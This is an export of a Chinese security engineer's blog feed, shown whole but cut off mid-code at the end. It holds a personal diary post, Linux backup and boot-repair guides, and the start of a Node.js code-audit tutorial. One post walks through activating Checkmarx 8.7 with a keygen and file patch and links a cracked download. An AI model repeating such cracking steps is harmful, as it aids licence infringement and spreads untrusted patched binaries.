    <content type="html"><![CDATA[<p>这大概就是生活</p><hr><blockquote><p>很早就想写这篇博文了，一直没找到合适的题目，今天突然想到，生活不会给我们这些凡人一个喘息的机会，与其苦思冥想，还不如利用有限的时间，随便写写，题目就随意点，这大概就是生活，将自己的所思所想写出来，这篇博文拖着写了好长时间，陆陆续续回顾了目前个人工作生活的一些感悟。各位也就随便看看，文章很水，很扯，耽误各位时间，实在见谅。</p></blockquote><p>毕业这么长时间，一直不断在向前奔跑，很累很想停下来，但是我没办法停下来，对于一个普通的不能再普通的农民子弟，在这灯红酒绿的帝都苟延存活，社会的残酷让我一刻都不能放松，不敢生病，不敢出游，不敢逛街，休息只会窝在出租屋里面看看电影，睡个懒觉，看看书，玩玩电脑。很怀念以前上学的日子，我现在逐渐都忘记了怎样去开怀大笑，有人可能觉得我这个人很矫情，本人就是这样，喜怒都会摆在脸上，但是生活慢慢的磨平了我们的棱角，让我们不敢正视自己真实的一面。</p><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>生活是美好的也是痛苦的。<br>旭哥19年留下一篇博文离开了北京，我得到消息的时候很诧异，也很难受。当时怀揣梦想，一起来北京搞安全，他做安全开发，我做安全服务，白驹过隙，留一下一篇博文，一个人静静的回老家发展，我或许知道是什么打败了那个热血的少年，但是我又不太清楚是什么让那个热血少年摒弃梦想，是生活吗？可能是吧，又或者不是。生活对我们这些人从来都是残酷的，但是它还给我保留了一丝希望，让我们在痛苦中还得奋力向前。一位前辈曾经和我说过，不经历社会的残酷，永远不会长大。我毕业来北京的第二天，被房东恶心了一把，找在某互联网中介平台上碰到了黑中介，然后租到了黑中介自己出租的一间4平米左右的隔断房（二房东），当时刚毕业，身上没钱，爷爷又查出了癌症，急着安顿下来回去看望爷爷，种种原因让我不得不咬咬牙大价钱租下那个小破屋。<br>当时来北京带了一卷行李，4箱书，4箱乱七八糟的东西，北京没有一个亲人，当时都寄放在北邮读研的师兄那里，师兄一箱一箱从快递点搬到宿舍，等我找到房子，又一箱一箱的从宿舍和我搬到我的房子，我依稀记得当时师兄从北邮租借了一辆电三轮车，帮我运到牡丹园，炎热的夏天，等搬完东西汗水已经把T恤浸透了。后来特别想找个时间请师兄吃个饭，可能是自己太无耻了，总是没找到机会请师兄吃饭，今年又赶上了疫情，师兄毕业了都没有再见上一面，我满怀愧意。在我困难的时候，帮助我的挚友和兄长们，我很想你们，很想和你们真挚的说一声谢谢。<br>以前特别喜欢喝酒，有事没事总会找老大小酌几杯，来帝都喝酒的次数屈指可数，不是穷，而是很少能找到挚友来谈心，箱子里放着各种酒，但是喝到嘴里却没有了味道，这大概就是生活，慢慢学会孤独。</p><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>曾经自认为自己是学霸级别的，上了大学以后，各种折腾，参加社团管理，参与志愿者活动，不断的浪费自己宝贵的时间，考试一塌糊涂，由于一科考试一直没有通过，毕业被延期半年。由于毕业证延期，没法正式入职，没法和公司谈薪资，没法选择自己心仪的公司，这可能是对自己的嘲讽，然后需要自己往后余生来承担。我以前特别瞧不上作弊，后来也想明白了，那也是一项本事，自己没有作弊的本事，又没有刻苦努力，活该自己挂科。<br>工作以后，慢慢尝试接收现实，强迫自己去完成那些没有人愿意去做的工作，难搞的客户。日常工作中领导基本上把一些低价烂项目都派给我了，原因大概就是算准我不敢轻易离职，拿着同届最低工资干了一年，当我不想再干了，然后疫情来了，断了我跳槽的念想。在疫情最严重的时候，我还得和我对象两个人，冒着感染的风险去给客户做代码审计，偌大的办公司只有寥寥几个人，我们真是在拿命干活。领导只是象征性的关心一下，从来没有落实到行动上，口罩得我自己去协调，午饭得自己带。我记得很清楚那天是2月18日，中午带着饭，客户那里没有微波炉，我被迫去便利蜂找售货员加热，为了加热，我还特意买了不少东西，但是结完账，售货员就以外带食物禁止加热，求了半天也不管用，当时真的很心寒，我都不知道自己是怎么啃完那盒冷米饭的，从那时我对公司毫无留恋。如果自己将来一天，没有能力，公司会毫不犹豫的把你踢开，从此毒鸡汤开路，抓紧时间来提升自己。学会摆脱学生思维，公司的发展，公司的决策和自己没有半毛钱的关系，我就一小娄娄，苟活于世，混口吃的就完事了，公司内斗就当一个笑话看看就行了。     </p><p>年底公司内斗终于有了一定的结果，“华为系”干掉“金融系”，有能力的陆陆续续开始找下家了，我一直不是出差就是在客户现场，等我回到公司，发现部门工位空荡荡的，不少同事不是找好了下家就是调换了部门。上周末请直系领导和前同事吃饭，本来就是聚一聚，领导突然和我说他也要走了，我当时很意外，很快也接受了这个现实，喝多了，周末颓废（难受）了一天，可能这就是男人最脆弱的时候，突然感觉好无力，看来还是自己太无能，预祝领导前程什锦。回想我现在的工作，突然发现之前好不容易组建的安全开发组，这就分崩离析了，有些难受，本来觉得今年研发的同事也不少，兵强马壮，可以和友商PK一下，现在看来，就是一个笑话。每年项目组为公司盈利过百万了，员工低工资持续了好几年，小公司派系斗争都这么严重，看来我该好好考虑一下自己的前途了。</p><h2 id="感情"><a href="#感情" class="headerlink" title="感情"></a>感情</h2><h3 id="女友"><a href="#女友" class="headerlink" title="女友"></a>女友</h3><p>来北京让我坚持下来的可能是我找到了我人生的另一半，单身二十多年，被女友拿下不容易，不容易。有了另一半的关怀，生活好过了不少，主要是精神层面的，让我不在孤单。我刚来北京，每天下班回到4平米小屋，从狭小的窗户望向灰蒙蒙的天空，好几次我都想好好哭一鼻子。虽说和女友在一块，也哭了好几次，主要是在一起，开销就是一个很大的问题，我的薪资一直被公司卡着，每个月都月光，又不好意思和家里要，某天晚上因为钱的事被女友给整哭了，当时有了换工作的想法，后来疫情来了不了了之。女友就不在这里秀了，请见谅。</p><h3 id="亲人"><a href="#亲人" class="headerlink" title="亲人"></a>亲人</h3><p>爷爷的离世，让我痛苦万分，我不止一次在痛恨自己没有找时间回去看望一下爷爷，本来准备周末买点儿灵芝粉回去看看爷爷，周五早上接到父亲的电话，爷爷走了，我瞬间懵逼了，我不知道该怎么做了，该哭还是该做什么，长这么大，第一次遇到至亲之人离世，让我不知所措，胸口憋得难受，真的很痛。我记得初中的时候，同桌的姥爷去世了，同桌伤心不已，我当时各种安慰，同桌可能是不耐烦了，回了我一句，你有至亲之人离世吗，你真的理解我吗？一瞬间我尬住了，我不知道该怎么回复了，因为我没有真得体会到这种至亲之人离世的悲痛之情，只是刻意的关心，最后结果适得其反。爷爷的离世却让我真真切切的体会到了，心很痛，想哭却怎么也哭不出来。女友在一旁安慰，想哭就哭出来，不要在心里憋着，瞬间泪如雨下。平复心情后匆忙赶回老家，中途魂不守舍，出了好多差错，当我赶到家门口，灵堂已经架起来了，虽说路上耽误了不少时间，终于在入殓之前见了爷爷最后一面，协助叔叔伯伯们入殓，棺材合上的一瞬间，从此阴阳两隔。爷爷的葬礼上出了不少幺蛾子，我就如同行尸走肉听从父辈们安排，家里的小院从来没有这么热闹过，音响的嘈杂声，唢呐的喧嚣声不绝于耳，我大概明白唢呐一响全剧终的含义了。爷爷的葬礼上我看清楚了人性，第一次看清了亲戚丑恶的嘴脸，明白了朋友的情谊，理解了父母的无奈。这可能就是长大的感觉，男人总会默默的承担一些东西，也会失去一些东西。我只想让爷爷葬礼顺顺利利，对于那些真心帮忙的亲朋好友，我会感激一生，对于那些挑事的，我会铭记一生。</p><p>我心里很不甘，多么希望可以再听爷爷叫我一声。后来也想明白了，自己太自私了，对于子欲养和亲不在的情况，原因只能是自己的孝心未尽到，不要为自己的不孝行为找借口。肺泡癌是多么痛苦的疾病，我从心里希望爷爷能等自己赶回去，但是这样的话他会忍受更多的痛苦，我的行为太自私了，这可能是对我最大的鞭笞，让我明白以后有空多陪陪父母亲人。</p><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul><li>身体是自己的，工作是公司的</li><li>学会摸鱼，努力提供自己能力，投资自己</li><li>维护好亲情、友情，多陪陪父母</li><li>处理好工作与生活</li><li>学会提防小人，保护自己，区别朋友和同事</li><li>西游记告诉我们，凡是有后台的妖怪都被接走了，凡是没后台的都被一棒子打死了。在职场也是一样的道理，没有本事就不要作妖。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.cnblogs.com/qjx-2016/p/10599169.html">https://www.cnblogs.com/qjx-2016/p/10599169.html</a>【再见，北京。】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安装并使用checkmarx进行代码审计</title>
    <link href="/2020/10/30/2020-10-30-install-checkmarx-and-crack/"/>
    <url>/2020/10/30/2020-10-30-install-checkmarx-and-crack/</url>
    
    <content type="html"><![CDATA[<p>安装并使用checkmarx进行代码审计</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在客户侧审计C++代码，本来前期交流已明确说明不做客户端代码审计，主要是没有太大的必要，浪费人力物力，并且对审计人员不太友好，进入现场实施发现客户极其不配合，而且盲目自信，对于这种客户我没有去说服他的勇气，只能按照他的意愿进行审计，审计正常开展，发现大量c++代码，这部分代码属于安卓客户端项目中底层的一些依赖组件，主要是安卓的native层，Native层这部分常见一些本地服务和一些链接库等。这一层的一个特点就是通过C和C++语言实现。比如我们现在要执行一个复杂运算，如果通过java代码去实现，那么效率会非常低，此时可以选择通过C或C++代码去实现，然后和我们上层的Java代码通信（这部分在android中称为jni机制）。又比如我们的设备需要运行，那么必然要和底层的硬件驱动交互，也要通过Native层。<br>对于native层代码的话，利用难度很高，而且没法通过一个native层的接口就能确定有安全风险，只能找一下是否存在危险函数，是否有一些逻辑问题，前期准备使用fortify sca辅助分析，但是fortify sca 分析C++代码需要将分析指令加到编译指令当中，修改安卓SDK的mmma命令，将fortify sca 扫描指令加到mmma函数中，通过运行，会出现各种问题，尝试各种办法后放弃了。目前只能用flawfinder,cppcheck检查一下了，整体效果很差经，这时候想到了checkmarx,尝试了一下还行，中规中矩。<br>本篇就是一片水文，看官酌情处理。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>从互联网上找到了checkmarx 8.7的按照包和激活工具，但是没有激活教程，网上也没找到，只能自己摸索着来，希望激活工具管用，百度云链接详见参考。</p><p><img src="/img/20201030-01.png" alt="20201030-01"><br>由于checkmarx耗费资源不少，使用内部的一台虚拟的windows server 2012来安装，由于某些杀软会删除checkmarx部分dll文件，需要先关闭杀软，我的这台内网服务器也没安装杀软，具体情况我也不清楚，官方安装文档中说明的，可详见Checkmarx安装说明文档8.7.pdf(该文档位于百度云压缩包中)</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先解压CxSAST.870.Release.Setup_8.7.0.57.zip，获取CxSetup.exe,使用管理员权限运行该安装文件。<br><img src="/img/20201030-02.png" alt="20201030-02"><br>初次安装选择多合一安装就行，如果需要自定义安装，根据手册进行安装<br><img src="/img/20201030-03.png" alt="20201030-03"></p><p>基本上都是直接一路点击下一步，注意，如果有许可证书可以输入证书，如果没有证书，选择请求新许可证</p><p><img src="/img/20201030-04.png" alt="20201030-04"></p><p>点击安装，静静的等待吧，除了安装checkmarx还会安装Microsoft SQL Server 2012,如果电脑上已安装过 Sql server 2012要注意，使用高级安装进行自定义安装。<br><img src="/img/20201030-05.png" alt="20201030-05"><br><img src="/img/20201030-06.png" alt="20201030-06"><br>安装成功<br><img src="/img/20201030-07.png" alt="20201030-07"><br>桌面上会生成两个快捷方式<br><img src="/img/20201030-08.png" alt="20201030-08"></p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>这里只是个人使用，自己就是一个穷鬼，如果单位使用，强烈建议采用官方正版授权。<br>进入checkmarx的安装目录，我这里是 *** C:\Program Files\Checkmarx\ ***<br>将CheckMarx_Keygen.zip压缩包中的文件解压到 *** License Importer *** 目录下，双击运行KeyGen_Check.exe ，这里需要注意，默认授权有效期是当前时间，建议修改有效期为未来的时间，看个人喜好，授权单位随便写就行，点击生成许可，生成证书。<br><img src="/img/20201030-09.png" alt="20201030-09"><br>然后点击修补程序<br><img src="/img/20201030-10.png" alt="20201030-10"><br>如果提示写入文件出错，大概率是IIS，checkmarx进程在后台运行，使用任务管理器，强制关闭即可<br><img src="/img/20201030-12.png" alt="20201030-12"><br><img src="/img/20201030-11.png" alt="20201030-11"><br><img src="/img/20201030-13.png" alt="20201030-13"><br>替换成功后，退出即可<br><img src="/img/20201030-14.png" alt="20201030-14"></p><p>点击License Importer目录下的CxLicenseImporter.exe，导入刚才生成的证书。<br><img src="/img/20201030-15.png" alt="20201030-15"><br>导入成功后，启动相关服务<br><img src="/img/20201030-16.png" alt="20201030-16"><br>确保以下这几个服务已启动，如果未启动，手动启动，如果启动出现问题，可能是证书问题，请重新生成证书。</p><ul><li>CxJobsManager</li><li>CxScansManager</li><li>CxSystemManager</li><li>CxScanEngine</li><li>IIS Admin Service</li><li>World Wide Web Publishing Service</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>桌面上的Checkmarx Portal是checkmarx url的快捷方式，Checkmarx Audit是本地客户端，点击 Checkmarx Portal 配置checkmarx,需要等待片刻。首先进行配置管理员账号和密码，（首次登陆设置超级管理员的账号和密码，复杂度要求是要有大写小写字母数字以及标点符号，最少为9位），这个要求挺变态的。<br><img src="/img/20201030-17.png" alt="20201030-17"><br>设置完成以后，可以登录checkmarx<br><img src="/img/20201030-18.png" alt="20201030-18"></p><p>checkmarx 使用很友好，通过创建项目，上传扫描源代码压缩包，然后等待就可以了。<br><img src="/img/20201030-20.png" alt="20201030-20"><br><img src="/img/20201030-21.png" alt="20201030-21"><br>点击Finish按钮后，进入查询界面，自动开始扫描源代码，checkmarx Audit 的使用和此类似。<br><img src="/img/20201030-22.png" alt="20201030-22"><br>扫描结果可以通过扫描列表查看，点击预览，可以查看详细的扫描信息，操作比较友好，不懂的可以随便点点就行了，步步高点火机，那里不会点那里。<br><img src="/img/20201030-23.png" alt="20201030-23"><br><img src="/img/20201030-24.png" alt="20201030-24"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>主要是配置以下默认语言，其他按需配置，依次点击Management-&gt;Application Settings -&gt; General，点击最下面的edit按钮进行编辑。<br><img src="/img/20201030-19.png" alt="20201030-19"></p><h2 id="遇到的错误"><a href="#遇到的错误" class="headerlink" title="遇到的错误"></a>遇到的错误</h2><p>我遇到的错误就是使用激活软件未修改授权有效期，只生成了当天的证书，当我第二天准备再试用一下，发现checkmarx多个进程无法启动，强制启动就会报错，相当尴尬，找了半天才发现是证书授权问题，好多时间被浪费了。</p><h3 id="20220331-更新"><a href="#20220331-更新" class="headerlink" title="20220331 更新"></a>20220331 更新</h3><p>有同学加我好友询问安装包解压密码，密码在《Checkmarx安装说明文档8.7.pdf》文档当中，checkmarx在互联网企业中使用的较多，博主从20年到现在，使用checkmarx比较少，并且尚未获取到最新的checkmarx安装版本，据某大厂的朋友说，由于checkmarx的规则一般，但是检测引擎集相关配套设施比较不错，他们自行在优化规则。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://pan.baidu.com/s/1mQjsUTWuhRuQyXvHL5smzQ">链接：https://pan.baidu.com/s/1mQjsUTWuhRuQyXvHL5smzQ 提取码：vlfk </a>【checkmarx 百度云】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Code Audit</category>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>guide</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用mondo备份恢复Linux操作系统</title>
    <link href="/2020/09/20/2020-09-20-backup-and-recure-os-with-mondo/"/>
    <url>/2020/09/20/2020-09-20-backup-and-recure-os-with-mondo/</url>
    
    <content type="html"><![CDATA[<p>使用mondo备份恢复Linux操作系统</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>首先先吐槽一下某大行运维人员，能力太弱，还不停的指责厂商为何不给提供的linux系统中安装图形操作界面，一个linux运维，不会配置网络，不会使用正则筛选，不会使用vim等等，整个过程中一副小人得志的嘴脸，让人感到恶心。我就不明白，一个菜鸡，就因为自己是甲方就可以随意指责乙方人员。拿钱干活，给钱走人，不想让我们来，早点儿说，无端指责，无法掩盖你的弱鸡，哈哈哈哈哈哈。<br>某行使用的vsphere虚拟套件，我们提前讲操作系统和应用系统配置加固完成打包成vof模板，方便客户导入到测试poc系统，客户机房在珠海，十几个G的模板文件传输相当长的时间，后期部署，不允许厂商部署，客户要自行部署，我们也同意了。客户导入过程中，长时间未相应，最终显示超时，厂商想查看一下具体问题，判断一下问题的原因，被行方拒绝了，只告诉我们导入不进去，我也是醉了。后来被逼无奈，只能临时构建环境，移除磁盘加密等加固方式，使用monod备份系统，难受的一匹</p><h2 id="安装mondo环境"><a href="#安装mondo环境" class="headerlink" title="安装mondo环境"></a>安装mondo环境</h2><p>在centos7中安装mondo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y wget<br><span class="hljs-built_in">cd</span> /etc/yum.repos.d/<br>wget ftp://ftp.mondorescue.org/rhel/7/x86_64/mondorescue.repo<br>yum clean all<br>yum update<br>yum install -y mondo --nogpgcheck<br></code></pre></td></tr></table></figure><p>配置 &#x2F;etc&#x2F;mindi&#x2F;mindi.conf 更改挂载的容量加入 <strong>EXTRA_SPACE&#x3D;8388608</strong> 这里单位是kb 大小是8G （1024<em>1024</em>8）后边如果是制作DVD ISO文件，其实4.4G就够用了，如果备份的系统比较大，这里暂时多设置一些，要不出现问题再修改，就会很浪费时间。</p><h2 id="制作iso文件"><a href="#制作iso文件" class="headerlink" title="制作iso文件"></a>制作iso文件</h2><p>网上说的，只能刻盘，不能做U盘启动运行，未验证。执行以下指令，启动mondo </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># mondoarchive</span><br></code></pre></td></tr></table></figure><p>选择磁盘<br><img src="/img/20200920-01.png" alt="20200920-01"><br>设定镜像存储目录<br><img src="/img/20200920-02.png" alt="20200920-02"><br>选择压缩方式<br><img src="/img/20200920-03.png" alt="20200920-03"><br>选择压缩级别<br><img src="/img/20200920-04.png" alt="20200920-04"><br>配置镜像大小，这里默认就行<br><img src="/img/20200920-05.png" alt="20200920-05"><br>设置镜像名称<br><img src="/img/20200920-06.png" alt="20200920-06"><br>设置备份目录<br><img src="/img/20200920-07.png" alt="20200920-07"><br>配置备份黑名单，默认&#x2F;tmp,&#x2F;proc不备份<br><img src="/img/20200920-08.png" alt="20200920-08"><br>设置临时缓冲目录，默认就行<br><img src="/img/20200920-09.png" alt="20200920-09"><br>配置Scratch目录名称<br><img src="/img/20200920-10.png" alt="20200920-10"><br>判断是否备份扩展属性<br><img src="/img/20200920-11.png" alt="20200920-11"><br>配置内核路径，默认即可<br><img src="/img/20200920-12.png" alt="20200920-12"><br>是否进行备份<br><img src="/img/20200920-13.png" alt="20200920-13"><br>是否开始备份<br><img src="/img/20200920-14.png" alt="20200920-14"><br>然后自动进行备份，等着就可以了<br><img src="/img/20200920-15.png" alt="20200920-15"><br><img src="/img/20200920-16.png" alt="20200920-16"><br><img src="/img/20200920-18.png" alt="20200920-18"><br>备份完成，点击回车，结束<br><img src="/img/20200920-19.png" alt="20200920-19"><br><img src="/img/20200920-20.png" alt="20200920-20"><br>在<code>/var/cache/mondo/</code>目录下，我们可以看到我们备份的镜像文件，可以使用sftp,ftp等方式，下载到本地。<br><img src="/img/20200920-21.png" alt="20200920-21"></p><h2 id="还原"><a href="#还原" class="headerlink" title="还原"></a>还原</h2><p>新建虚拟机，加载导出的镜像文件<br><img src="/img/20200920-22.png" alt="20200920-22"><br>启动，进入mondo恢复引导界面<br><img src="/img/20200920-23.png" alt="20200920-23"><br>输入nuke指令，回车进行系统还原，然后就耐性等待吧<br><img src="/img/20200920-24.png" alt="20200920-24"><br><img src="/img/20200920-25.png" alt="20200920-25"><br>系统提示备份完成，点击回车，输入<code>reboot</code>进行重启即可<br><img src="/img/20200920-26.png" alt="20200920-26"><br><img src="/img/20200920-27.png" alt="20200920-27"><br><img src="/img/20200920-28.png" alt="20200920-28"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.howtoing.com/how-to-clone-linux-systems">https://www.howtoing.com/how-to-clone-linux-systems</a>【如何克隆&#x2F;备份Linux系统使用 - Mondo Rescue灾难恢复工具】</li></ul>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Backup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>导入centos7虚拟机出现dracut-initqueue timeout</title>
    <link href="/2020/09/10/2020-09-10-dracut-initqueue-timeout/"/>
    <url>/2020/09/10/2020-09-10-dracut-initqueue-timeout/</url>
    
    <content type="html"><![CDATA[<p>导入centos7虚拟机出现dracut-initqueue timeout</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>拷贝centos7虚拟机导入到客户的虚拟集群，导入过程不多讲，一起正常，在启动过程中，出现 <strong>dracut-initqueue timeout</strong>，通过分析启动日志，发现内核无法加载硬盘，dracut提供shell中工具不多，也无法定位问题具体出在那里，由于磁盘使用lvm的形式，个人猜测可能是由于硬件发生变化，缺乏驱动，导致无法启动。重启以后使用单用户模式登录系统，一些正常，可以直接挂在磁盘并引导系统，可能某些模块无法加载导致的，个人太菜，实在无法定位。</p><p><img src="/img/20200910-01.png" alt="dracut-initqueue timeout"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>重启系统，grub选择救援模式（recure)选项，进入救援模式，然后执行</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">dracut</span> <span class="hljs-literal">--</span><span class="hljs-comment">force</span> <span class="hljs-literal">--</span><span class="hljs-comment">no</span><span class="hljs-literal">-</span><span class="hljs-comment">hostonly</span><br></code></pre></td></tr></table></figure><p>后续在官方的文档上发现：</p><blockquote><p>The dracut command can be used to modify the contents of your initramfs. For example, if you are going to move your hard drive to a new computer, you might want to temporarily include all drivers in the initramfs to be sure that the operating system can load on the new computer. To do so, you would run the following command:</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment"># dracut</span> <span class="hljs-literal">--</span><span class="hljs-comment">force</span> <span class="hljs-literal">--</span><span class="hljs-comment">no</span><span class="hljs-literal">-</span><span class="hljs-comment">hostonly</span><br></code></pre></td></tr></table></figure><p>The force parameter tells dracut that it is OK to overwrite the existing initramfs archive. The no-hostonly parameter overrides the default behavior of including only drivers that are germane to the currently-running computer and causes dracut to instead include all drivers in the initramfs.</p></blockquote><p>移动硬盘到一台新的设备上，可能驱动出现问题，使用force参数覆盖initramfs，使用no-hostonly参数，仅加载与当前系统运行相关驱动模块。我使用以上指令，重构initramfs,重启以后发现仍然无法正常启动。我这里使用了加密模块，对磁盘进行加密，开机自动解密磁盘，可能未加载解密密钥。我执行一下指令，重构一下initramfs，重启后可以正常进入系统</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># dracut --force</span><br></code></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>对于dracut-initqueue timeout错误，互联网检索到的都是加载centos系统安装盘出现问题，和本文提到现象相同但是不是同一个问题，所以解决方法也不同。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://fedoramagazine.org/initramfs-dracut-and-the-dracut-emergency-shell/">https://fedoramagazine.org/initramfs-dracut-and-the-dracut-emergency-shell/</a>【initramfs dracut and the dracut emergency shell】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用docker安装配置openRASP</title>
    <link href="/2020/08/24/2020-08-04-install-and-config-openRASP-with-docker/"/>
    <url>/2020/08/24/2020-08-04-install-and-config-openRASP-with-docker/</url>
    
    <content type="html"><![CDATA[<p>使用docker安装配置openRASP</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href=""></a>【】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IAST</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs code audit</title>
    <link href="/2020/06/28/2020-06-28-nodejs-code-audit/"/>
    <url>/2020/06/28/2020-06-28-nodejs-code-audit/</url>
    
    <content type="html"><![CDATA[<p>nodejs 源代码安全审计</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近碰到几个nodejs的代码审计项目，看来nodejs在企业内部还是有一定的用户群体，之前翻译过国外的一篇nodejs安全清单的文章，但是文章并未阐述如何审计一个nodejs项目，这次借审计的机会，把个人对于nodejs项目审计的经验积累一下，欢迎来喷。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>1、ide(atom、sublime、vscode、nodepad++等等)，根据个人爱好选择<br>2、被审计的源代码<br>3、nodejs环境<br>4、静态分析工具(dependency check、fortify sca、npm、nodejsscan、Retire.js等)</p><h2 id="nodejs源代码审计思路"><a href="#nodejs源代码审计思路" class="headerlink" title="nodejs源代码审计思路"></a>nodejs源代码审计思路</h2><p>代码审计通常采用人工审查+SCA工具扫描的的方式进行审计，人工审计的方法有以下四种：</p><ul><li>正向数据流分析</li><li>逆向数据流分析</li><li>根据功能点定向分析</li><li>通读全文</li></ul><h3 id="正向数据流分析"><a href="#正向数据流分析" class="headerlink" title="正向数据流分析"></a>正向数据流分析</h3><h4 id="确定获取数据方法"><a href="#确定获取数据方法" class="headerlink" title="确定获取数据方法"></a>确定获取数据方法</h4><p>1、获取GET请求内容</p><p>由于GET请求直接被嵌入在路径中，URL是完整的请求路径，包括了?后面的部分，因此你可以手动解析后面的内容作为GET请求的参数。node.js 中url模块中的 <em>parse</em> 函数提供了这个功能，我们可以使用 <em>url.parse</em> 方法来解析URL中的参数。<br>实例：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>&#125;);<br>    res.end(util.inspect(<span class="hljs-built_in">url</span>.parse(req.url, <span class="hljs-literal">true</span>)));<br>&#125;).listen(<span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><p>2、获取POST请求内容</p><p>POST 请求的内容全部的都在请求体中，http.ServerRequest 并没有一个属性内容为请求体，原因是等待请求体传输可能是一件耗时的工作。比如上传文件，而很多时候我们可能并不需要理会请求体的内容，恶意的POST请求会大大消耗服务器的资源，所以node.js默认是不会解析请求体的，当你需要的时候，需要手动来做。<br>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><br>http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)&#123;<br>    <span class="hljs-comment">// 定义了一个post变量，用于暂存请求体的信息</span><br>    <span class="hljs-keyword">var</span> post = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// 通过req的data事件监听函数，每当接受到请求体的数据，就累加到post变量中</span><br>    req.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>)&#123;<br>        post += 